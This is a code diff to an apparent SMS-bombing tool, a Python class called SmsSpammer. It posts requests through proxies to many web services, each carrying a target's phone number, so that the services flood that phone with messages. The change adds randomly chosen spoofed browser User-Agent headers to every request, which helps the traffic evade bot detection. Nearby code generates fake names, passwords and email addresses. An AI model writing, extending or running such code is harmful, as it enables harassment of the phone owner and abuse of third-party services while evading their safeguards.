@@ -38,6 +38,29 @@ class SmsSpammer:
             self.password = self.name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
             self.email = "{}@gmail.com".format(self.name)
 
+        headers = [
+                {
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0',
+                    'Accept': '*/*'
+                },
+                {
+                "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
+                'Accept': '*/*'
+                },
+                {
+                "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
+                'Accept': '*/*'
+                },
+                {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0',
+                'Accept': '*/*'
+                },
+                {
+                "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0",
+                'Accept': '*/*'
+                },
+                ]
+        self.header = random.choice(headers)
         services = pkgutil.get_data('boss','data/servicesList.json').decode("utf-8")
         services = services.replace("$phone$",self.phoneNumber)
         services = services.replace("$name$",self.name)
@@ -48,11 +71,11 @@ class SmsSpammer:
     async def asyncSendSMS(self,session, websiteData,proxy ):
         try:
             if websiteData["kind"] == "data":
-                await session.post(websiteData["url"], data=websiteData["data"], proxy="http://"+proxy, timeout=self.timeout)
+                await session.post(websiteData["url"], data=websiteData["data"], proxy="http://"+proxy, timeout=self.timeout, headers=self.header)
             elif websiteData["kind"] == "json":
-                await session.post(websiteData["url"], json=websiteData["data"], proxy="http://"+proxy, timeout=self.timeout)
+                await session.post(websiteData["url"], json=websiteData["data"], proxy="http://"+proxy, timeout=self.timeout, headers=self.header)
             elif websiteData["kind"] == "params":
-                await session.post(websiteData["url"], params=websiteData["data"], proxy="http://"+proxy, timeout=self.timeout)
+                await session.post(websiteData["url"], params=websiteData["data"], proxy="http://"+proxy, timeout=self.timeout, headers=self.header)
             return 1
         except:
             self.timeoutCounter = self.timeoutCounter + 1
